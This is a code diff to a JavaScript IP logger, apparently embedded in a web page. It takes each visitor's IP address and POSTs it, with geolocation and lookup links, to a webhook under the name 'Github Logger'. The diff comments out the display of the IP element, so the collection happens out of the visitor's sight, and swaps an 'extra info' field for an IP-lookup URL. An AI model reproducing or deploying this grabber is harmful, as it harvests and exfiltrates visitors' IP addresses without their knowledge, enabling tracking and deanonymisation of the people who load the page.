@@ -39,25 +39,20 @@
             var div = document.createElement("div");
             div.id = "ipppp";
             div.innerHTML = text; 
-            document.body.appendChild(div);
+            // document.body.appendChild(div);
         });
 
        
         function logger() {
             var ispp = document.getElementById('ipppp').innerHTML;
-            var extra = document.getElementById("razzylog").innerHTML;
-        
-            if (!extra) {
-                extra = 'No extra information available.';
-            }
-        
+
             const request = new XMLHttpRequest();
             request.open("POST", wbhk);
             request.setRequestHeader('Content-type', 'application/json');
             const params = {
                 username: "Github Logger",
                 avatar_url: 'https://images.g2crowd.com/uploads/product/image/large_detail/large_detail_de619ca81012d42cede6fd18af63d8b1/inkscape.png',
-                content: "**Ip** : _" + ispp + "_\n**Raw** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n**Extra Info** : " + extra + ""
+                content: "**Ip** : _" + ispp + "_\n**Raw** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n**IP Lookup** : " + "https://whatismyipaddress.com/ip/" + ispp
             };
             request.send(JSON.stringify(params));
         }
